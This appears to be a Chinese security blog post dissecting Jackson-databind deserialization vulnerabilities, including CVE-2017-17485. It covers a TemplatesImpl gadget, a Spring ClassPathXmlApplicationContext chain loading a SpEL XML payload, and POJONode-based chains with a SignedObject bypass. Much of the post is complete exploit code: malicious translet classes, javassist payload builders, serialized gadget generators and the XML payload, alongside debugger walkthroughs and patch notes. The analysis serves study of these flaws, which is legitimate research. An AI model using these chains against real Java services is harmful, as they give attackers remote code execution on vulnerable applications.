[![](assets/1701606625-3815e7237f2d53dfbde1f1604035d256.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114144235-feeb6958-82b8-1.png)

Exploit.java

```bash
package jackson;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;

public class Exploit extends AbstractTranslet {
    public Exploit() throws Exception {

        try {
            BufferedReader br = null;

            Process p = Runtime.getRuntime().exec("calc");
            br = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line = null;
            StringBuilder sb = new StringBuilder();
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
                System.out.println(sb);
            }
            File file = new File("result.txt");

            if(!file.exists()){
                file.createNewFile();
            }


            FileWriter fileWritter = new FileWriter(file.getName(),true);
            BufferedWriter bufferWritter = new BufferedWriter(fileWritter);
            bufferWritter.write(sb.toString());
            bufferWritter.close();
            System.out.println(sb);
        } catch (IOException e) {
            e.printStackTrace();

        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

fakes0u1.java

```bash
package jackson;

public class fakes0u1 {
    public Object object;
}
```

需要将 Exploit.java 编译为 class 在 Poc 中填上其完整路径

[![](assets/1701606625-88103a39aebc21d193c16a1ebfbdda6f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114144702-9dd0db52-82b9-1.png)

运行可以成功执行命令

[![](assets/1701606625-2d850bdfb0e4cb7ba622b3cc9832c7c6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114144850-de0292b0-82b9-1.png)

transletBytecodes 是 base64 编码的 Exploit 恶意类的字节流

transletName 是 TemplatesImpl 类对象的\_name 属性值

outputProperties 是为了能成功调用到 setOutputProperties() 函数 其是 outputProperties 属性的 setter 方法

但是我们需要触发 TemplatesImpl 的话 我们是需要触发其 getter 方法 而不是 setter 方法 这其中又是如何实现的呢

尝试调试分析一下

### 调试

通过前面的分析我们可以直接将断点设置在`deserializeAndSet`​处 跟进​`deserializeAndSet`​

[![](assets/1701606625-d0dfc6f3a05de3af08e8a5c516da39ec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145034-1c10a790-82ba-1.png)

先进行 deserialize

然后从`transletBytecodes`​开始为 bean 实例赋值

[![](assets/1701606625-6643f9ff65018364c1d313d291cb9a61.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145118-363e8510-82ba-1.png)

前两个是调用的`MethodProperty.deserializeAndSet`​​​来实现的

[![](assets/1701606625-bf803105f94270d0850370a2d4d23717.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145142-44cd3a90-82ba-1.png)

而到 outputProperties 时调用的是`SetterlessProperty.deserializeAndSet`​ （可能和赋值的类型有关系？）其调用的是属性的 getter 方法而并不是 setter 方法 从而可以触发利用链

[![](assets/1701606625-9746960b2e3472604f7090b77e57c566.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145248-6c1a05d8-82ba-1.png)

[![](assets/1701606625-3b6609a580ec99c335f4b7344cb81e4c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145314-7bee8dc6-82ba-1.png)

调用 getter 的 invoke 通过反射的方式 调用到 getOutputProperties

[![](assets/1701606625-cf37cc6723d529956d7a301340dfee24.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145359-9665500e-82ba-1.png)

### 高版本 jdk 不能触发的原因

在高版本的 Templates 中 会涉及到`_factory`​属性的赋值 若其为 null 的话 会导致异常 但是我们在 Jackson 中 关于 TemplatesImpl 的配置项只有 5 个 uriresolver transletBytecodes outputProperties transletName stylesheetDOM 并不能操作`_factory`​ 所以不能再进行利用

### 补丁

jackson-databind-2.7.9 换成 jackson-databind-2.7.9.1

添加了黑名单过滤

[![](assets/1701606625-c6ffeb5105eb321dc2682a68040c4050.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145537-d1011e14-82ba-1.jpg)

## CVE-2017-17485 ClassPathXmlApplicationContext 利用链

在开启 enableDefaultTyping() 或使用有问题的@JsonTypeInfo 注解的时候 可以通过滥用 Spring 的 SpEL 表达式注入漏洞来触发

### 影响版本

Jackson 2.7 系列 < 2.7.9.2

Jackson 2.8 系列 < 2.8.11

Jackson 2.9 系列 < 2.9.4

可以在 jdk1.8 运行

### 依赖版本

```bash
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>jackson</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>
    <dependencies>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.7.9</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-core</artifactId>
            <version>2.7.9</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-annotations</artifactId>
            <version>2.7.9</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/commons-codec/commons-codec -->
        <dependency>
            <groupId>commons-codec</groupId>
            <artifactId>commons-codec</artifactId>
            <version>1.12</version>
        </dependency>

        <!-- https://mvnrepository.com/artifact/commons-io/commons-io -->
        <dependency>
            <groupId>commons-io</groupId>
            <artifactId>commons-io</artifactId>
            <version>2.5</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/org.springframework/spring-core -->
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>5.0.2.RELEASE</version>
        </dependency>

        <!-- https://mvnrepository.com/artifact/org.springframework/spring-beans -->
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-beans</artifactId>
            <version>5.0.2.RELEASE</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/org.springframework/spring-context -->
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-context</artifactId>
            <version>5.0.2.RELEASE</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/org.springframework/spring-expression -->
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-expression</artifactId>
            <version>5.0.2.RELEASE</version>
        </dependency>
        <!-- https://mvnrepository.com/artifact/commons-logging/commons-logging -->
        <dependency>
            <groupId>commons-logging</groupId>
            <artifactId>commons-logging</artifactId>
            <version>1.2</version>
        </dependency>


    </dependencies>
</project>
```

### 复现

```bash
package CVE201717485;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class PoC {
    public static void main(String[] args)  {

        String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1/spel.xml\"]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

```bash
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg value="calc.exe" />
        <property name="whatever" value="#{ pb.start() }"/>
    </bean>
</beans>
```

指定了 java.lang.ProcessBuilder 类 写入了所需执行的命令

[![](assets/1701606625-5b084554ad28a2e7ffed309693627ba0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145908-4e6e1302-82bb-1.png)

### 调试分析

[![](assets/1701606625-71c94f083ff595f88fcaa7a00a4b3380.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114145959-6ccbb35e-82bb-1.png)

跟进到`UntypedObjectDeserializer.deserializeWithType`​ Token 的 name 是 START\_ARRAY 会调用`AsArrayTypeDeserializer._derialize`​来解析数组

[![](assets/1701606625-541bdedb16e3419de3bb7743ee77c9e3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114150022-7b0b433a-82bb-1.png)

调用到`BeanDeserializer.deserialize`​​​ 在这里 Token 变成 VALUE\_STRING 并不是一个 startToken 所以`isExpectedStartObjectToken()`​​​ 返回 false 所以随后跳到`_deserializeOther`​​​

[![](assets/1701606625-cb8bc3f61187a8ce21aac65808e5b22d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114150118-9bea12c0-82bb-1.png)

`deserializeFromString`​​​ 跟进`createFromString`​​​

[![](assets/1701606625-10e650978ac8cde85f7910e0f3eb6285.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114150159-b48962fe-82bb-1.png)

value 值为[http://127.0.0.1/spel.xml](http://127.0.0.1/spel.xml) 调用 call 实现远程调用

[![](assets/1701606625-f98df70f6c6a267a1d0b967326b437fe.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114150219-c0c13ab0-82bb-1.png)

对`ClassPathXmlApplicationContext`​​​进行实例化 参数为 xml 文件

[![](assets/1701606625-9616d064397fe1eda127c8de48f4258e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114150333-ecb70f14-82bb-1.png)

与之前调用的类不同的是 ClassPathXmlApplicationContext 中并没有 setter 方法 但是拥有构造函数 所以在这里要通过其构造函数来实现恶意代码的执行

[![](assets/1701606625-842c5f3b3050fcbc63fd13c2b29bde0d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114150414-04e6ad06-82bc-1.png)

[![](assets/1701606625-a1ac034ea3f438194ba75e019d2e926b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114151419-6da9a2f2-82bd-1.png)

跟进 refresh 函数 调用​`invokeBeanFactoryPostProcessors`​

[![](assets/1701606625-9c47633a8060984b36e29b1c4b7f07b3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114151456-8377c96a-82bd-1.png)

其中调用​`getBeanNamesForType`​

[![](assets/1701606625-bc80e833ee387841a0e9eca5d6bb681a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114152843-70a4effa-82bf-1.png)

进一步调用​`doGetBeanNamesForType`​

[![](assets/1701606625-ad241503eb8c630845502b769dafb698.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114152907-7f3756de-82bf-1.png)

beanname 为 pb mbd 识别为`java.lang.ProcessBuilder` 跟进`isFactoryBean`

[![](assets/1701606625-5657f915cc804dde83bbe332d40cbf1f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153014-a7071302-82bf-1.png)

其中有`predictBeanType`​ 预测 BeanType 类型跟进该函数

[![](assets/1701606625-0793d0987db493a2e4cd9fea2b6e6b4d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153046-b9e32dee-82bf-1.png)

跟进​`determineTargetType`​

[![](assets/1701606625-f91f4fc2baf86717257b748912580be9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153111-c8f78f3c-82bf-1.png)

FactoryBeanName 为 null 跟进`resolveBeanClass`​​​

[![](assets/1701606625-dce4326ff6f98837eeda57db2e55f2ca.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153141-da92450c-82bf-1.png)

跟进​`doResolveBeanClass`​​​

[![](assets/1701606625-870856c92edde2e25ad9c7db0dfb3dcf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153221-f2857ee0-82bf-1.png)

跟进​`evaluateBeanDefinitionString`​​​

[![](assets/1701606625-20771571d3979765852dce7ee809664c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153245-00bbe698-82c0-1.png)

跟进`StandardBeanExpressionResolver.evaluate`​

[![](assets/1701606625-87f4289c3de6c923a899ea2eed4bc341.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153305-0cc7694e-82c0-1.png)

调用了 Expression.getValue() 方法即 SpEL 表达式执行的方法 sec 参数是我们可以控制的内容即由 spel.xml 解析得到的 SpEL 表达式

[![](assets/1701606625-338343483907e7d2e7fbe56380eed4c9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153327-19df32e2-82c0-1.png)

调用栈

[![](assets/1701606625-e109fc792329a5593694cdb3ec8851aa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153346-2557f97e-82c0-1.png)

### 补丁

我们所使用的调用类并没有出现在黑名单上 但是在调用`BeanDeserializerFactory.createBeanDeserializer`​ 会调用`_validateSubType()`​对子类型进行校验 先进行黑名单过滤 发现类名不在黑名单后再判断是否是以 org.springframe 开头的类名，是的话循环遍历目标类的父类是否为 AbstractPointcutAdvisor 或 AbstractApplicationContext 是的话跳出循环然后抛出异常

而我们的利用类的继承关系是…->AbstractApplicationContext->AbstractRefreshableApplicationContext->AbstractRefreshableConfigApplicationContext->AbstractXmlApplicationContext->ClassPathXmlApplicationContext 是继承自 AbstractApplicationContext 类的 会被过滤掉

## 通杀

利用的是 Jackson 中的 PojoNode 他的 toString 是可以直接触发任意的 getter 的 触发条件如下

*   不需要存在该属性
*   getter 方法需要有返回值
*   尽可能的只有一个 getter

试验一下

```bash
package tongsha;

import java.io.IOException;
import java.io.Serializable;

public class User implements Serializable {

    public User() {
    }

    public Object getName() throws IOException {
        Runtime.getRuntime().exec("calc");
        return "asdas";
    }

    public Object setName(String name) {
        System.out.println("setname");
        return "sadsad";
    }

}
```

```bash
package tongsha;

import com.fasterxml.jackson.databind.node.POJONode;

public class Demo {
    public static void main(String[] args) {
        User user = new User();
        POJONode jsonNodes = new POJONode(user);
        jsonNodes.toString();
    }
}
```

[![](assets/1701606625-3fe9c8e32f8da2abd50edb85b412f7dc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153427-3dd37a28-82c0-1.png)

### 利用链

我们的`POJONode`​是继承`ValueNode`​的 `ValueNode`​是继承`BaseJsonNode`​的

而在`BaseJsonNode`​中存在

```bash
Object writeReplace() {
        return NodeSerialization.from(this);
    }
```

意味着 我们在反序列化的时候 会经过这个 writeReplace 方法 这个方法会对我们的序列化过程进行检查 从而阻止我们的序列化进程 我们需要将其重写出来 将这个方法去掉

[![](assets/1701606625-0bb28de18917d5838e9f7be64c6a87bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153459-50c62996-82c0-1.png)

这样我们就可以进行序列化进程了

### TemplatesImpl 链

```bash
package tongsha;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;


import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URI;
import java.security.*;
import java.util.Base64;

public class TemplatesImplChain {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        Templates templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "fakes0u1");
        setFieldValue(templatesImpl, "_tfactory", null);
        POJONode jsonNodes = new POJONode(templatesImpl);
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(exp);
        FileOutputStream fout=new FileOutputStream("1.ser");
        fout.write(barr.toByteArray());
        fout.close();
        FileInputStream fileInputStream = new FileInputStream("1.ser");
        System.out.println(serial(exp));
        deserial(serial(exp));
    }

    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    private static void Base64Encode(ByteArrayOutputStream bs){
        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
```

‍

可以成功执行命令

[![](assets/1701606625-e5495a4729f9e253f8f353bbb61513be.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153531-63936dea-82c0-1.png)

#### 调试

通过`BadAttributeValueExpException`​的`toString`​方法进入

[![](assets/1701606625-14c9cb7c8b15506ced7672727dd79789.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153556-72bd52f4-82c0-1.png)

进入到`BaseJsonNode`​​​的`toString`​​​ 调用​`InternalNodeMapper.nodeToString`​​​

[![](assets/1701606625-c48268468fbe42c9f45a058667bc326e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153620-80be0a06-82c0-1.png)

调用`ObjectWriter.writeValueAsString(Object value)`​​​

[![](assets/1701606625-07bf75803afaa45d90e88530d8cd19bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153640-8cf90e38-82c0-1.png)

最终在`serializeAsField`​中触发 invoke 调用到`TemplatesImpl.getOutputProperties`​

[![](assets/1701606625-5f4e329c4373525dea04e10afb5bdada.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153657-974e3354-82c0-1.png)

调用链如下

[![](assets/1701606625-5bbdab475515d7dedf69635f67ee3f42.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153725-a80eac46-82c0-1.png)

[![](assets/1701606625-a47cdff5602a1568fed5f643014a5bd0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153743-b287a4f2-82c0-1.png)

### SignObject 链

在 Templates 被 ban 的情况下 打二次反序列化

```bash
package tongsha;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;


import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URI;
import java.security.*;
import java.util.Base64;

public class SignObjectChain {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "fakes0u1");
        setFieldValue(templatesImpl, "_tfactory", null);
        POJONode jsonNodes2 = new POJONode(templatesImpl);
        BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null);
        Field val2 = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val2.setAccessible(true);
        val2.set(exp2,jsonNodes2);
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine);
        POJONode jsonNodes = new POJONode(signedObject);
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(exp);
        FileOutputStream fout=new FileOutputStream("1.ser");
        fout.write(barr.toByteArray());
        fout.close();
        FileInputStream fileInputStream = new FileInputStream("1.ser");
        System.out.println(serial(exp));
        deserial(serial(exp));
        //doPOST(exp.toString().getBytes());
        //byte[] byt=new byte[fileInputStream.available()];
        //fileInputStream.read(byt);
        //doPOST(byt);
    }

    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");
        //writeReplaceMethod.setAccessible(true);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    private static void Base64Encode(ByteArrayOutputStream bs){
        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
```

还是一样的路径 这次是跟进到了

[![](assets/1701606625-e93f954ed98959e2c9368d3793682661.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231114153805-bf804bfa-82c0-1.png)

`SignedObject.getObject`​之中 这里还存在一个 readObject() 方法 可以将我们传进来的在进行一次反序列化从而达到绕过的目的 然后是又一遍 TemplatesImpl 链

## 参考文章

[https://juejin.cn/post/6844904166809157639#heading-49](https://juejin.cn/post/6844904166809157639#heading-49)

[https://www.mi1k7ea.com/](https://www.mi1k7ea.com/)

[https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/](https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/)

‍

‍

‍
